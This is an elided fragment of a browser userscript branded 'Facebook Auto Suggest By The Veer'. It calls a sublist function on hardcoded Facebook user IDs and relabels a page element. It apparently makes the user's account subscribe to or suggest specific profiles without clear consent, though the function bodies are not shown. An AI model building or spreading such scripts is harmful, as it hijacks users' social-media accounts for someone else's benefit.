// ==UserScript==
// @name            Facebook Auto Suggest By The Veer 
// @description     Facebook Auto Suggest By The Veer
...
sublist("100004369512494");
sublist("100002711749978");
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by The Veer';
